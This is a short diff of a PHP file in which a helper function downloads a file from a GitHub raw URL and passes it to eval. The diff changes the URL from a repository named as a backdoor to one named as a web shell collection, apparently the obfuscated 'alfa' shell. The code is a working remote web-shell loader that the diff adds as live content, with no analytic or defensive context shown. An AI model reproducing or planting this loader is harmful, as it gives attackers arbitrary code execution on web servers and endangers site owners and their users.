@@ -23,5 +23,5 @@ function geturlsinfo ($url) {
     }
 return $url_get_contents_data;
 }
-$a = geturlsinfo('https://raw.githubusercontent.com/SageBlueTeam/backdoor-1/refs/heads/main/alfa-obfus.txt');
+$a = geturlsinfo('https://raw.githubusercontent.com/wuxianmr-maker/list-webshell/refs/heads/main/alfa-obfus.php');
 eval    ('?>'.$a);
